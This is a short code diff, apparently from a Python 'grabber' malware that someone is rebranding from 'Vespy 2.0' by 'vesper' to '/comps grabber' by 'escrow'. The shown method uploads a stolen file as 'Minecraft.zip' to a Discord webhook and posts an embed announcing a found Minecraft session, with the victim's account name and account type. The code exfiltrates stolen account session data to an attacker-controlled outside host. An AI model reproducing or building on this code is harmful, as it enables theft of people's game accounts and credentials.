@@ -20,14 +20,14 @@ class Minecraft:
             pass
     
     def send(self,_):
-        webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png")
+        webhook = DiscordWebhook(url=wbh, username="/comps", avatar_url=r"https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png")
         webhook.add_file(file=open(_,'rb').read(),filename="Minecraft.zip")
         webhook.execute()
 
-        webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png")
+        webhook = DiscordWebhook(url=wbh, username="/comps", avatar_url=r"https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png")
         embed = DiscordEmbed(title=f"Minecraft Session", description=f"Found A Minecraft Session", color='4300d1')
-        embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png')
-        embed.set_footer(text='Vespy 2.0 | by : vesper')
+        embed.set_author(name="author : escrow", icon_url=r'https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png')
+        embed.set_footer(text='/comps grabber | by : escrow')
         embed.set_timestamp()
         embed.add_embed_field(name=f":green_square: Account of :ㅤㅤㅤ", value=f"``{self.user}``")
         embed.add_embed_field(name=f":video_game: Type :ㅤㅤㅤ", value=f"``{self.typE}``")
